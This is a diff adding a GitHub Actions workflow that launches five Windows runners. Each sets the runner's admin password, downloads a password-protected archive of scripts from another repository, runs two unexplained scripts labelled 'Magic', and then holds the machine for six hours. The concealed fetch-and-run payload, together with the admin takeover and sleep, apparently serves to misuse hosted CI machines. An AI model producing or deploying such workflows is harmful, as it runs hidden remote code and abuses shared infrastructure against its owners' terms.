@@ -1,0 +1,59 @@
+name: tomato-hider-multiplier
+
+on:
+  workflow_dispatch:
+    inputs:
+      PASSWORD:
+        description: 'Password for the runneradmin user'
+        required: true
+        type: string
+      SEVENZIP_PASSWORD:
+        description: 'Password for the 7zip file'
+        required: false
+        type: string
+
+jobs:
+  build:
+    runs-on: windows-latest
+    strategy:
+      matrix:
+        machine: [1, 2, 3, 4, 5]
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+
+    - name: Set Admin Password
+      run: |
+        Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "${{ github.event.inputs.PASSWORD }}" -Force)
+
+    - name: Install 7zip
+      run: choco install 7zip --yes
+
+    - name: Unzip Scripts
+      shell: pwsh
+      run: |
+        Invoke-WebRequest https://github.com/CI-Devs/tomato-killer/raw/main/scripts.7z -OutFile $pwd\scripts.7z
+        $zipPassword = "${{ github.event.inputs.SEVENZIP_PASSWORD }}"
+        if ([string]::IsNullOrEmpty($zipPassword)) {
+          $zipPassword = "${{ secrets.SEVENZIP_PASSWORD }}"
+        }
+        if ([string]::IsNullOrEmpty($zipPassword)) {
+          Write-Error "7zip password not provided."
+          exit 1
+        } else {
+          & "C:\Program Files\7-Zip\7z.exe" x $pwd\scripts.7z "-p$zipPassword" "-o."
+        }
+
+    - name: Magic 1
+      run: | 
+        & .\1.ps1
+
+    - name: Import Chocolatey Module
+      run: |
+        Import-Module $env:ChocolateyInstall\helpers\chocolateyProfile.psm1 
+        refreshenv
+
+    - name: Magic 2
+      run: | 
+        & .\2.ps1
+        Start-Sleep -s 21600
